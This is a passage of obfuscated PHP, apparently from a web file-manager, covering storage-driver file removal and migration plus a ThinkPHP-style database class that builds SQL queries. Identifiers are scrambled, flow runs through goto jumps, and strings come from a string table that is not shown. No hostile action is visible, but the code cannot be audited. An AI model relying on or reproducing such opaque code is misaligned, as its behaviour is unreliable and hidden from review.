$DÈ ¿ğÆ˜§ = array_to_keyvalue(parent::listData(), $BâˆÔšÎ‰[363]); if (!isset($DÈ ¿ğÆ˜§[$fÒ½šæÌË®])) { return !1; } $D­¢É–¹± = $DÈ ¿ğÆ˜§[$fÒ½šæÌË®]; $D­¢É–¹±[$BâˆÔšÎ‰[6]] = json_decode_force($D­¢É–¹±[$BâˆÔšÎ‰[6]]); return $D­¢É–¹±; } public function remove($f¦Ëéä») { $this->removeShareItems($f¦Ëéä»); return parent::remove($f¦Ëéä»); } public function removeWithFile($cêñ“ÂÍï) { goto dâ”´ÖÑù; dâ”´ÖÑù: $b”ß‘ÌÂó =& $_SERVER[Ìó]; $Bíò‡éŸˆã = array($b”ß‘ÌÂó[739] => $cêñ“ÂÍï); $d¼©Í—ëÎ = Model($b”ß‘ÌÂó[417])->where($Bíò‡éŸˆã)->count(); goto a»”ê©‘‘; f¾„ãŒ³Û: $Cá­¿Á„Ÿ…->task[$b”ß‘ÌÂó[694]] = (double) $DÇ„»óªˆƒ; $b …ìèˆßß = KodIO::defaultDriver(); $f¡¯õÚÀ¾† = $b …ìèˆßß[$b”ß‘ÌÂó[363]]; goto BÍ¨–÷—ƒ¯; aŞ°”åÉÚ: if (!$fÉàõÚ›‰) { $Cá­¿Á„Ÿ…->stop($aÊº‡›İ‹); return !1; } $Cá­¿Á„Ÿ…->end(); $this->remove($cêñ“ÂÍï); goto A»Œì•¹Ãä; BÍ¨–÷—ƒ¯: $b¾¿¥à¿…‘ = "\x7b\x69\157\x3a{$f¡¯õÚÀ¾†}\x7d\x2f"; $fÉàõÚ›‰ = !0; $fÏ‚µŒšä§ = array(); goto BÖô—´Ö÷à; a»”ê©‘‘: $DÇ„»óªˆƒ = Model($b”ß‘ÌÂó[417])->where($Bíò‡éŸˆã)->sum($b”ß‘ÌÂó[77]); $aÊº‡›İ‹ = $b”ß‘ÌÂó[2334] . $cêñ“ÂÍï; $Cá­¿Á„Ÿ… = new TaskFileTransfer($aÊº‡›İ‹, $b”ß‘ÌÂó[2335], $d¼©Í—ëÎ, LNG($b”ß‘ÌÂó[2336]) . "\x28{$cêñ“ÂÍï}\51"); goto f¾„ãŒ³Û; BÖô—´Ö÷à: $d¦Ô™©æ…ä = Model($b”ß‘ÌÂó[163])->where($Bíò‡éŸˆã)->field($b”ß‘ÌÂó[2337])->select(); foreach ($d¦Ô™©æ…ä as $F‡ø¢“·ñ–) { goto eÓÂø­©¿ò; bå÷ À·–ø: if (IO::exist($d¹ŒšæŠ£Ò)) { $Cá­¿Á„Ÿ…->updateFileEnd($F‡ø¢“·ñ–[$b”ß‘ÌÂó[28]], $F‡ø¢“·ñ–[$b”ß‘ÌÂó[77]]); continue; } if (!IO::move($Eà†‰Ù‰£±, get_path_father($d¹ŒšæŠ£Ò))) { $fÉàõÚ›‰ = !1; break; } $Bíò‡éŸˆã = array($b”ß‘ÌÂó[414] => $F‡ø¢“·ñ–[$b”ß‘ÌÂó[414]]); goto f³²¶ä†ô; eÓÂø­©¿ò: $Eà†‰Ù‰£± = $F‡ø¢“·ñ–[$b”ß‘ÌÂó[75]]; $d¹ŒšæŠ£Ò = $b¾¿¥à¿…‘ . str_replace("\x7b\x69\157\x3a{$cêñ“ÂÍï}\x7d\x2f", $b”ß‘ÌÂó[33], $Eà†‰Ù‰£±); if (!IO::exist($Eà†‰Ù‰£±)) { $fÏ‚µŒšä§[] = $F‡ø¢“·ñ–[$b”ß‘ÌÂó[414]]; $Cá­¿Á„Ÿ…->updateFileEnd($F‡ø¢“·ñ–[$b”ß‘ÌÂó[28]], $F‡ø¢“·ñ–[$b”ß‘ÌÂó[77]]); continue; } goto bå÷ À·–ø; f³²¶ä†ô: $a¾íÅ„„Ìî = array($b”ß‘ÌÂó[739] => $f¡¯õÚÀ¾†, $b”ß‘ÌÂó[75] => $d¹ŒšæŠ£Ò); Model($b”ß‘ÌÂó[163])->where($Bíò‡éŸˆã)->save($a¾íÅ„„Ìî); goto fØÊé×®©’; fØÊé×®©’: } $this->removeByFileID($fÏ‚µŒšä§); goto aŞ°”åÉÚ; A»Œì•¹Ãä: } public function progress($ašã¶´µÆø) { return Task::get($_SERVER[Ìó][2334] . $ašã¶´µÆø); } private function removeByFileID($fåóÛ›¦–Ÿ = array()) { goto AŒÍå»¼Å; AŒÍå»¼Å: $d²Ï¹õÒÍ =& $_SERVER[Ìó]; if (empty($fåóÛ›¦–Ÿ)) { return; } $aÃ«½šê‹ = array($d²Ï¹õÒÍ[414] => array($d²Ï¹õÒÍ[7], $fåóÛ›¦–Ÿ)); goto bÜË¥ˆàÃ¹; dø¸¦êÁŞ™: foreach ($dÍãœå as $e—²ÊùæÅÑ) { Model($d²Ï¹õÒÍ[378])->removeNow($e—²ÊùæÅÑ, !1); } goto d‰ÃŸÍ®»ô; bÜË¥ˆàÃ¹: $dÍãœå = Model($d²Ï¹õÒÍ[1106])->where($aÃ«½šê‹)->field($d²Ï¹õÒÍ[365])->select(); if (!$dÍãœå) { return; } $dÍãœå = array_to_keyvalue($dÍãœå, $d²Ï¹õÒÍ[33], $d²Ï¹õÒÍ[365]); goto dø¸¦êÁŞ™; d‰ÃŸÍ®»ô: } private function removeShareItems($CÃç³›·™) { goto b’åæ—ª‘; b’åæ—ª‘: $FÑäí•’ƒó =& $_SERVER[Ìó]; $f¹„öªìÑ = "\x7b\x69\157\72{$CÃç³›·™}\175\x2f"; $dÆ¤³ÑíÉØ = array($FÑäí•’ƒó[365] => 0, $FÑäí•’ƒó[1014] => array($FÑäí•’ƒó[747], "{$f¹„öªìÑ}\45")); goto aÛÕ¤‡åÂ; DŒëøÜ£: Model($FÑäí•’ƒó[531])->remove($dâ£øöÀÁä); goto cÊ´ê±£Õ¯; aÛÕ¤‡åÂ: $f®Èç¿¿ŠÑ = Model($FÑäí•’ƒó[2049])->where($dÆ¤³ÑíÉØ)->field($FÑäí•’ƒó[436])->select(); if (empty($f®Èç¿¿ŠÑ)) { return; } $dâ£øöÀÁä = array_to_keyvalue($f®Èç¿¿ŠÑ, $FÑäí•’ƒó[33], $FÑäí•’ƒó[436]); goto DŒëøÜ£; cÊ´ê±£Õ¯: } } goto d³„ê¨øÒë; d„²ëÍÁâ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\75", "\x6e\145\161" => "\x3c\x3e", "\x67\x74" => "\x3e", "\145\x67\164" => "\76\x3d", "\x6c\164" => "\x3c", "\x65\154\x74" => "\x3c\x3d", "\156\x6f\x74\154\x69\x6b\x65" => "\116\x4f\x54\40\x4c\x49\x4b\105", "\154\x69\153\x65" => "\114\x49\x4b\x45", "\151\156" => "\x49\116", "\x6e\x6f\x74\x69\156" => "\116\x4f\124\x20\x49\x4e", "\x6e\157\x74\40\x69\156" => "\116\117\x54\40\x49\x4e", "\x62\x65\x74\167\x65\145\x6e" => "\x42\x45\124\127\105\x45\116", "\156\157\x74\x62\145\164\167\145\145\x6e" => "\x4e\x4f\x54\x20\x42\105\x54\127\x45\105\x4e", "\x6e\x6f\164\40\x62\x65\164\167\145\145\156" => "\116\x4f\124\x20\102\x45\124\127\x45\x45\116"); protected $selectSql = "\x53\x45\114\105\x43\124\45\x44\x49\123\x54\x49\116\103\124\45\x20\x25\106\111\105\114\x44\x25\x20\x46\x52\117\115\40\x25\124\x41\x42\114\x45\45\45\x4a\117\x49\x4e\x25\x25\127\110\x45\x52\x45\x25\45\107\x52\x4f\x55\120\45\x25\110\101\x56\111\x4e\107\45\x25\x4f\122\x44\105\x52\45\45\x4c\x49\x4d\111\124\45\40\45\x55\x4e\x49\117\x4e\45\45\103\x4f\115\115\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $Aè“ÁĞ¯Ú = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ìó][873], $Aè“ÁĞ¯Ú); } public function factory($Cœéµ…ï‡ = '') { goto E–£¢¿‹—; aøˆùÚ÷â“: $this->dbType = ucwords(strtolower($Cœéµ…ï‡[$b­¹Ìá•[874]])); $eßã–½Õ¨’ = $b­¹Ìá•[876] . $this->dbType; if (class_exists($eßã–½Õ¨’)) { $eÏ¾¡ƒİ = new $eßã–½Õ¨’($Cœéµ…ï‡); if ($b­¹Ìá•[720] != strtolower($Cœéµ…ï‡[$b­¹Ìá•[874]])) { $eÏ¾¡ƒİ->dbType = strtoupper($this->dbType); } else { $eÏ¾¡ƒİ->dbType = $this->_getDsnType($Cœéµ…ï‡[$b­¹Ìá•[826]]); } } else { think_exception(think_lang($b­¹Ìá•[877]) . $b­¹Ìá•[878] . $eßã–½Õ¨’); } goto fè½ˆÉƒåÒ; E–£¢¿‹—: $b­¹Ìá• =& $_SERVER[Ìó]; $Cœéµ…ï‡ = $this->parseConfig($Cœéµ…ï‡); if (empty($Cœéµ…ï‡[$b­¹Ìá•[874]])) { think_exception(think_lang($b­¹Ìá•[875])); } goto aøˆùÚ÷â“; fè½ˆÉƒåÒ: return $eÏ¾¡ƒİ; goto aˆ­ ÷Ù’Ù; aˆ­ ÷Ù’Ù: } public function __call($aÄî…›Ğåõ, $eæíœÑŞÒ) { if (method_exists($this, $aÄî…›Ğåõ)) { return call_user_func_array(array($this, $aÄî…›Ğåõ), $eæíœÑŞÒ); } } protected function _getDsnType($aé²Ïâ…–¼) { $F¿ß¼ÄõëË = explode($_SERVER[Ìó][4], $aé²Ïâ…–¼); $E›…«ğ¸ñÑ = strtoupper(trim($F¿ß¼ÄõëË[0])); return $E›…«ğ¸ñÑ; } private function parseConfig($D‘î’à¦ê¬ = '') { $EÊ•Ÿ—Ü =& $_SERVER[Ìó]; if (!empty($D‘î’à¦ê¬) && is_string($D‘î’à¦ê¬)) { $D‘î’à¦ê¬ = $this->parseDSN($D‘î’à¦ê¬); } elseif (is_array($D‘î’à¦ê¬)) { $D‘î’à¦ê¬ = array_change_key_case($D‘î’à¦ê¬); $D‘î’à¦ê¬ = array($EÊ•Ÿ—Ü[874] => $D‘î’à¦ê¬[$EÊ•Ÿ—Ü[719]], $EÊ•Ÿ—Ü[799] => $D‘î’à¦ê¬[$EÊ•Ÿ—Ü[879]], $EÊ•Ÿ—Ü[800] => $D‘î’à¦ê¬[$EÊ•Ÿ—Ü[880]], $EÊ•Ÿ—Ü[797] => $D‘î’à¦ê¬[$EÊ•Ÿ—Ü[881]], $EÊ•Ÿ—Ü[798] => $D‘î’à¦ê¬[$EÊ•Ÿ—Ü[882]], $EÊ•Ÿ—Ü[17] => $D‘î’à¦ê¬[$EÊ•Ÿ—Ü[883]], $EÊ•Ÿ—Ü[826] => $D‘î’à¦ê¬[$EÊ•Ÿ—Ü[721]], $EÊ•Ÿ—Ü[13] => isset($D‘î’à¦ê¬[$EÊ•Ÿ—Ü[884]]) ? $D‘î’à¦ê¬[$EÊ•Ÿ—Ü[884]] : array()); } elseif (empty($D‘î’à¦ê¬)) { if (think_config($EÊ•Ÿ—Ü[885]) && $EÊ•Ÿ—Ü[720] != strtolower(think_config($EÊ•Ÿ—Ü[886]))) { $D‘î’à¦ê¬ = $this->parseDSN(think_config($EÊ•Ÿ—Ü[885])); } else { $D‘î’à¦ê¬ = array($EÊ•Ÿ—Ü[874] => think_config($EÊ•Ÿ—Ü[886]), $EÊ•Ÿ—Ü[799] => think_config($EÊ•Ÿ—Ü[887]), $EÊ•Ÿ—Ü[800] => think_config($EÊ•Ÿ—Ü[888]), $EÊ•Ÿ—Ü[797] => think_config($EÊ•Ÿ—Ü[889]), $EÊ•Ÿ—Ü[798] => think_config($EÊ•Ÿ—Ü[890]), $EÊ•Ÿ—Ü[17] => think_config($EÊ•Ÿ—Ü[230]), $EÊ•Ÿ—Ü[826] => think_config($EÊ•Ÿ—Ü[885]), $EÊ•Ÿ—Ü[13] => think_config($EÊ•Ÿ—Ü[891])); } } return $D‘î’à¦ê¬; } protected function initConnect($c©‰İÎà’å = true) { if (1 == think_config($_SERVER[Ìó][18])) { $this->_linkID = $this->multiConnect($c©‰İÎà’å); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($eÄïçâÚíæ = false) { $f­Œæ‘³¾ =& $_SERVER[Ìó]; static $BÊš‘ò¨¼„ = array(); if (empty($BÊš‘ò¨¼„)) { foreach ($this->config as $fÅ¤—‰ØÔ => $EÈëœàÊÙÁ) { $BÊš‘ò¨¼„[$fÅ¤—‰ØÔ] = explode($f­Œæ‘³¾[47], $EÈëœàÊÙÁ); } } if (think_config($f­Œæ‘³¾[892])) { if ($eÄïçâÚíæ) { $fà©ˆ”É¹– = floor(mt_rand(0, think_config($f­Œæ‘³¾[893]) - 1)); } else { if (is_numeric(think_config($f­Œæ‘³¾[894]))) { $fà©ˆ”É¹– = think_config($f­Œæ‘³¾[894]); } else { $fà©ˆ”É¹– = floor(mt_rand(think_config($f­Œæ‘³¾[893]), count($BÊš‘ò¨¼„[$f­Œæ‘³¾[797]]) - 1)); } } } else { $fà©ˆ”É¹– = floor(mt_rand(0, count($BÊš‘ò¨¼„[$f­Œæ‘³¾[797]]) - 1)); } $EºŸ³ÉÑÚ™ = array($f­Œæ‘³¾[799] => isset($BÊš‘ò¨¼„[$f­Œæ‘³¾[799]][$fà©ˆ”É¹–]) ? $BÊš‘ò¨¼„[$f­Œæ‘³¾[799]][$fà©ˆ”É¹–] : $BÊš‘ò¨¼„[$f­Œæ‘³¾[799]][0], $f­Œæ‘³¾[800] => isset($BÊš‘ò¨¼„[$f­Œæ‘³¾[800]][$fà©ˆ”É¹–]) ? $BÊš‘ò¨¼„[$f­Œæ‘³¾[800]][$fà©ˆ”É¹–] : $BÊš‘ò¨¼„[$f­Œæ‘³¾[800]][0], $f­Œæ‘³¾[797] => isset($BÊš‘ò¨¼„[$f­Œæ‘³¾[797]][$fà©ˆ”É¹–]) ? $BÊš‘ò¨¼„[$f­Œæ‘³¾[797]][$fà©ˆ”É¹–] : $BÊš‘ò¨¼„[$f­Œæ‘³¾[797]][0], $f­Œæ‘³¾[798] => isset($BÊš‘ò¨¼„[$f­Œæ‘³¾[798]][$fà©ˆ”É¹–]) ? $BÊš‘ò¨¼„[$f­Œæ‘³¾[798]][$fà©ˆ”É¹–] : $BÊš‘ò¨¼„[$f­Œæ‘³¾[798]][0], $f­Œæ‘³¾[17] => isset($BÊš‘ò¨¼„[$f­Œæ‘³¾[17]][$fà©ˆ”É¹–]) ? $BÊš‘ò¨¼„[$f­Œæ‘³¾[17]][$fà©ˆ”É¹–] : $BÊš‘ò¨¼„[$f­Œæ‘³¾[17]][0], $f­Œæ‘³¾[826] => isset($BÊš‘ò¨¼„[$f­Œæ‘³¾[826]][$fà©ˆ”É¹–]) ? $BÊš‘ò¨¼„[$f­Œæ‘³¾[826]][$fà©ˆ”É¹–] : $BÊš‘ò¨¼„[$f­Œæ‘³¾[826]][0], $f­Œæ‘³¾[13] => isset($BÊš‘ò¨¼„[$f­Œæ‘³¾[13]][$fà©ˆ”É¹–]) ? $BÊš‘ò¨¼„[$f­Œæ‘³¾[13]][$fà©ˆ”É¹–] : $BÊš‘ò¨¼„[$f­Œæ‘³¾[13]][0]); return $this->connect($EºŸ³ÉÑÚ™, $fà©ˆ”É¹–); } public function parseDSN($D‰«çì“¯) { $b¤‚Ä“¶  =& $_SERVER[Ìó]; if (empty($D‰«çì“¯)) { return !1; } $d²Æƒ¸ŒŒ¥ = parse_url($D‰«çì“¯); if ($d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [164]]) { $Aˆ‹–èÕĞ = array($b¤‚Ä“¶ [874] => $d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [164]], $b¤‚Ä“¶ [799] => isset($d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [530]]) ? $d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [530]] : $b¤‚Ä“¶ [33], $b¤‚Ä“¶ [800] => isset($d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [895]]) ? $d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [895]] : $b¤‚Ä“¶ [33], $b¤‚Ä“¶ [797] => isset($d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [165]]) ? $d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [165]] : $b¤‚Ä“¶ [33], $b¤‚Ä“¶ [798] => isset($d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [166]]) ? $d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [166]] : $b¤‚Ä“¶ [33], $b¤‚Ä“¶ [17] => isset($d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [75]]) ? substr($d²Æƒ¸ŒŒ¥[$b¤‚Ä“¶ [75]], 1) : $b¤‚Ä“¶ [33]); } else { preg_match($b¤‚Ä“¶ [896], trim($D‰«çì“¯), $E·Ó¾‡‡Ü); $Aˆ‹–èÕĞ = array($b¤‚Ä“¶ [874] => $E·Ó¾‡‡Ü[1], $b¤‚Ä“¶ [799] => $E·Ó¾‡‡Ü[2], $b¤‚Ä“¶ [800] => $E·Ó¾‡‡Ü[3], $b¤‚Ä“¶ [797] => $E·Ó¾‡‡Ü[4], $b¤‚Ä“¶ [798] => $E·Ó¾‡‡Ü[5], $b¤‚Ä“¶ [17] => $E·Ó¾‡‡Ü[6]); } $Aˆ‹–èÕĞ[$b¤‚Ä“¶ [826]] = $b¤‚Ä“¶ [33]; return $Aˆ‹–èÕĞ; } protected function debug() { $aìİ‹³ˆÓ =& $_SERVER[Ìó]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $aìİ‹³ˆÓ[897]; if (think_config($aìİ‹³ˆÓ[898])) { think_status($aìİ‹³ˆÓ[899]); think_trace($this->queryStr . $aìİ‹³ˆÓ[900] . think_status($aìİ‹³ˆÓ[20], $aìİ‹³ˆÓ[899], 6) . $aìİ‹³ˆÓ[901], $aìİ‹³ˆÓ[33], $aìİ‹³ˆÓ[902]); } } protected function parseLock($bËíÓŒƒ = false) { $Bá•—Ê—Â‰ =& $_SERVER[Ìó]; if (!$bËíÓŒƒ) { return $Bá•—Ê—Â‰[33]; } if ($Bá•—Ê—Â‰[828] == $this->dbType) { return $Bá•—Ê—Â‰[903]; } return $Bá•—Ê—Â‰[904]; } protected function parseSet($D¢˜à³í¼ò) { $C†µç¤‚ˆ˜ =& $_SERVER[Ìó]; foreach ($D¢˜à³í¼ò as $d„à‰Ä‡ä => $fó‚˜©Ê®ï) { if (is_array($fó‚˜©Ê®ï) && $C†µç¤‚ˆ˜[281] == $fó‚˜©Ê®ï[0]) { $fÆÑËÖÏ‚[] = $this->parseKey($d„à‰Ä‡ä) . $C†µç¤‚ˆ˜[905] . $fó‚˜©Ê®ï[1]; } elseif (is_scalar($fó‚˜©Ê®ï) || is_null($fó‚˜©Ê®ï)) { $fÆÑËÖÏ‚[] = $this->parseKey($d„à‰Ä‡ä) . $C†µç¤‚ˆ˜[905] . $this->parseValue($fó‚˜©Ê®ï); } } return $C†µç¤‚ˆ˜[906] . implode($C†µç¤‚ˆ˜[47], $fÆÑËÖÏ‚); } protected function bindParam($Có“‹¢Ò„á, $d¸ã‰ÑÚé) { $this->bind[$_SERVER[Ìó][4] . $Có“‹¢Ò„á] = $d¸ã‰ÑÚé; } protected function parseBind($F¬Ú¯¤Š©) { $F¬Ú¯¤Š© = array_merge($this->bind, $F¬Ú¯¤Š©); $this->bind = array(); return $F¬Ú¯¤Š©; } function parseKey(&$CÒƒ²Ü®†Œ, $DŞ´è¥Û‰Û = true) { if ($DŞ´è¥Û‰Û) { $CÒƒ²Ü®†Œ = $this->parseKeyCheck($CÒƒ²Ü®†Œ); } return $CÒƒ²Ü®†Œ; } function parseKeyCheck($D¥Ô†ºŠøù) { $Bñ‡»İƒÊ‰ =& $_SERVER[Ìó]; $D¥Ô†ºŠøù = trim($D¥Ô†ºŠøù); if (!preg_match($Bñ‡»İƒÊ‰[907], $D¥Ô†ºŠøù)) { think_exception($Bñ‡»İƒÊ‰[908] . $D¥Ô†ºŠøù); } return $D¥Ô†ºŠøù; } protected function parseValue($d†»îà£É£) { $E¬“†ÎÃ»ª =& $_SERVER[Ìó]; if (is_string($d†»îà£É£)) { $d†»îà£É£ = $E¬“†ÎÃ»ª[867] . $this->escapeString($d†»îà£É£) . $E¬“†ÎÃ»ª[867]; } elseif (isset($d†»îà£É£[0]) && is_string($d†»îà£É£[0]) && strtolower($d†»îà£É£[0]) == $E¬“†ÎÃ»ª[281]) { $d†»îà£É£ = $this->escapeString($d†»îà£É£[1]); } elseif (is_array($d†»îà£É£)) { $d†»îà£É£ = array_map(array($this, $E¬“†ÎÃ»ª[868]), $d†»îà£É£); } elseif (is_bool($d†»îà£É£)) { $d†»îà£É£ = $d†»îà£É£ ? $E¬“†ÎÃ»ª[83] : $E¬“†ÎÃ»ª[463]; } elseif (is_null($d†»îà£É£)) { $d†»îà£É£ = $E¬“†ÎÃ»ª[99]; } return $d†»îà£É£; } protected function parseField($F£¶—”è”) { $e¸Ñˆ‹¦„æ =& $_SERVER[Ìó]; if (is_string($F£¶—”è”) && strpos($F£¶—”è”, $e¸Ñˆ‹¦„æ[47])) { $F£¶—”è” = explode($e¸Ñˆ‹¦„æ[47], $F£¶—”è”); } if (is_array($F£¶—”è”)) { $Bêˆ¤Â”• = array(); foreach ($F£¶—”è” as $c‰§¤Ê˜Å => $aÉò’ é”Ë) { if (!is_numeric($c‰§¤Ê˜Å)) { $Bêˆ¤Â”•[] = $this->parseKey($c‰§¤Ê˜Å) . $e¸Ñˆ‹¦„æ[909] . $this->parseKey($aÉò’ é”Ë); } else { $Bêˆ¤Â”•[] = $this->parseKey($aÉò’ é”Ë); } } $f ½Ş¦Ş = implode($e¸Ñˆ‹¦„æ[47], $Bêˆ¤Â”•); } elseif (is_string($F£¶—”è”) && !empty($F£¶—”è”)) { $f ½Ş¦Ş = $F£¶—”è”; } else { $f ½Ş¦Ş = $e¸Ñˆ‹¦„æ[172]; } return $f ½Ş¦Ş; } protected function parseTable($bª×ğ×Û¢…) { $Aœ‘åšÎ„» =& $_SERVER[Ìó]; if (is_array($bª×ğ×Û¢…)) { $EÌ­Èùé± = array(); foreach ($bª×ğ×Û¢… as $B„ó©İ£Àã => $CöãŸáÌ£‹) { if (!is_numeric($B„ó©İ£Àã)) { $EÌ­Èùé±[] = $this->parseKey($B„ó©İ£Àã) . $Aœ‘åšÎ„»[50] . $this->parseKey($CöãŸáÌ£‹); } else { $EÌ­Èùé±[] = $this->parseKey($B„ó©İ£Àã); } } $bª×ğ×Û¢… = $EÌ­Èùé±; } elseif (is_string($bª×ğ×Û¢…)) { if (strstr($bª×ğ×Û¢…, $Aœ‘åšÎ„»[50])) { return $bª×ğ×Û¢…; } $bª×ğ×Û¢… = explode($Aœ‘åšÎ„»[47], $bª×ğ×Û¢…); array_walk($bª×ğ×Û¢…, array($this, $Aœ‘åšÎ„»[816])); } return $Aœ‘åšÎ„»[910] . trim(implode($Aœ‘åšÎ„»[911], $bª×ğ×Û¢…), $Aœ‘åšÎ„»[822]) . $Aœ‘åšÎ„»[910]; } protected function parseWhere($E†¡ˆªŒù®) { $Dîæ‡Ú†”è =& $_SERVER[Ìó]; $EÚÙ¦Äñƒê = $Dîæ‡Ú†”è[33]; if (is_string($E†¡ˆªŒù®)) { $EÚÙ¦Äñƒê = $E†¡ˆªŒù®; } else { $e²œ¥§õ Œ = isset($E†¡ˆªŒù®[$Dîæ‡Ú†”è[912]]) ? strtoupper($E†¡ˆªŒù®[$Dîæ‡Ú†”è[912]]) : $Dîæ‡Ú†”è[33]; if (in_array($e²œ¥§õ Œ, array($Dîæ‡Ú†”è[913], $Dîæ‡Ú†”è[914], $Dîæ‡Ú†”è[915]))) { $e²œ¥§õ Œ = $Dîæ‡Ú†”è[50] . $e²œ¥§õ Œ . $Dîæ‡Ú†”è[50]; unset($E†¡ˆªŒù®[$Dîæ‡Ú†”è[912]]); } else { $e²œ¥§õ Œ = $Dîæ‡Ú†”è[916]; } foreach ($E†¡ˆªŒù® as $DÀãÉ„Òõ‹ => $bÎŒ¨ ÕîÉ) { $EÚÙ¦Äñƒê .= $Dîæ‡Ú†”è[261]; if (is_numeric($DÀãÉ„Òõ‹)) { $DÀãÉ„Òõ‹ = $Dîæ‡Ú†”è[917]; } if (0 === strpos($DÀãÉ„Òõ‹, $Dîæ‡Ú†”è[70])) { $EÚÙ¦Äñƒê .= $this->parseThinkWhere($DÀãÉ„Òõ‹, $bÎŒ¨ ÕîÉ); } else { if (!preg_match($Dîæ‡Ú†”è[918], trim($DÀãÉ„Òõ‹))) { think_exception(think_lang($Dîæ‡Ú†”è[919]) . $Dîæ‡Ú†”è[4] . $DÀãÉ„Òõ‹); } $aÚĞ¥¦©Ô = is_array($bÎŒ¨ ÕîÉ) && isset($bÎŒ¨ ÕîÉ[$Dîæ‡Ú†”è[920]]); $DÀãÉ„Òõ‹ = trim($DÀãÉ„Òõ‹); if (strpos($DÀãÉ„Òõ‹, $Dîæ‡Ú†”è[267])) { $CÖĞÍ©¥ÖÆ = explode($Dîæ‡Ú†”è[267], $DÀãÉ„Òõ‹); $BƒëÌ÷Í‡¨ = array(); foreach ($CÖĞÍ©¥ÖÆ as $aÄïË†ô¦Ò => $D¥®¿Á‡ä’) { $Eˆ–ì¾Ë = $aÚĞ¥¦©Ô ? $bÎŒ¨ ÕîÉ[$aÄïË†ô¦Ò] : $bÎŒ¨ ÕîÉ; $BƒëÌ÷Í‡¨[] = $Dîæ‡Ú†”è[244] . $this->parseWhereItem($this->parseKey($D¥®¿Á‡ä’), $Eˆ–ì¾Ë) . $Dîæ‡Ú†”è[815]; } $EÚÙ¦Äñƒê .= implode($Dîæ‡Ú†”è[921], $BƒëÌ÷Í‡¨); } elseif (strpos($DÀãÉ„Òõ‹, $Dîæ‡Ú†”è[268])) { $CÖĞÍ©¥ÖÆ = explode($Dîæ‡Ú†”è[268], $DÀãÉ„Òõ‹); $BƒëÌ÷Í‡¨ = array(); foreach ($CÖĞÍ©¥ÖÆ as $aÄïË†ô¦Ò => $D¥®¿Á‡ä’) { $Eˆ–ì¾Ë = $aÚĞ¥¦©Ô ? $bÎŒ¨ ÕîÉ[$aÄïË†ô¦Ò] : $bÎŒ¨ ÕîÉ; $BƒëÌ÷Í‡¨[] = $Dîæ‡Ú†”è[244] . $this->parseWhereItem($this->parseKey($D¥®¿Á‡ä’), $Eˆ–ì¾Ë) . $Dîæ‡Ú†”è[815]; } $EÚÙ¦Äñƒê .= implode($Dîæ‡Ú†”è[916], $BƒëÌ÷Í‡¨); } else { $EÚÙ¦Äñƒê .= $this->parseWhereItem($this->parseKey($DÀãÉ„Òõ‹), $bÎŒ¨ ÕîÉ); } } $EÚÙ¦Äñƒê .= $Dîæ‡Ú†”è[262] . $e²œ¥§õ Œ; } $EÚÙ¦Äñƒê = substr($EÚÙ¦Äñƒê, 0, -strlen($e²œ¥§õ Œ)); } return empty($EÚÙ¦Äñƒê) ? $Dîæ‡Ú†”è[33] : $Dîæ‡Ú†”è[922] . $EÚÙ¦Äñƒê; } protected function parseWhereItem($E™‚šë›·µ, $aÄĞ¬Ö æ») { $F ‹“Ì³ğğ =& $_SERVER[Ìó]; $aô¼ğçóØô = $F ‹“Ì³ğğ[33]; if (is_array($aÄĞ¬Ö æ»)) { if (is_string($aÄĞ¬Ö æ»[0])) { $E£¸í³Í‰ = strtolower($aÄĞ¬Ö æ»[0]); if (in_array($aÄĞ¬Ö æ»[0], array($F ‹“Ì³ğğ[905], $F ‹“Ì³ğğ[923], $F ‹“Ì³ğğ[924], $F ‹“Ì³ğğ[925], $F ‹“Ì³ğğ[926], $F ‹“Ì³ğğ[927]))) { $aô¼ğçóØô .= $E™‚šë›·µ . $F ‹“Ì³ğğ[50] . $aÄĞ¬Ö æ»[0] . $F ‹“Ì³ğğ[50] . $this->parseValue($aÄĞ¬Ö æ»[1]); } elseif (preg_match($F ‹“Ì³ğğ[928], $aÄĞ¬Ö æ»[0])) { $aô¼ğçóØô .= $E™‚šë›·µ . $F ‹“Ì³ğğ[50] . $this->exp[$E£¸í³Í‰] . $F ‹“Ì³ğğ[50] . $this->parseValue($aÄĞ¬Ö æ»[1]); } elseif (preg_match($F ‹“Ì³ğğ[929], $aÄĞ¬Ö æ»[0])) { if (is_array($aÄĞ¬Ö æ»[1])) { $Døæ®¯ºíÍ = isset($aÄĞ¬Ö æ»[2]) ? strtoupper($aÄĞ¬Ö æ»[2]) : $F ‹“Ì³ğğ[914]; if (in_array($Døæ®¯ºíÍ, array($F ‹“Ì³ğğ[913], $F ‹“Ì³ğğ[914], $F ‹“Ì³ğğ[915]))) { $E•ŒĞàâ = array(); foreach ($aÄĞ¬Ö æ»[1] as $D‹çßøï) { $E•ŒĞàâ[] = $E™‚šë›·µ . $F ‹“Ì³ğğ[50] . $this->exp[$E£¸í³Í‰] . $F ‹“Ì³ğğ[50] . $this->parseValue($D‹çßøï); } $aô¼ğçóØô .= $F ‹“Ì³ğğ[244] . implode($F ‹“Ì³ğğ[50] . $Døæ®¯ºíÍ . $F ‹“Ì³ğğ[50], $E•ŒĞàâ) . $F ‹“Ì³ğğ[815]; } } else { $aô¼ğçóØô .= $E™‚šë›·µ . $F ‹“Ì³ğğ[50] . $this->exp[$E£¸í³Í‰] . $F ‹“Ì³ğğ[50] . $this->parseValue($aÄĞ¬Ö æ»[1]); } } elseif ($F ‹“Ì³ğğ[281] == $E£¸í³Í‰) { 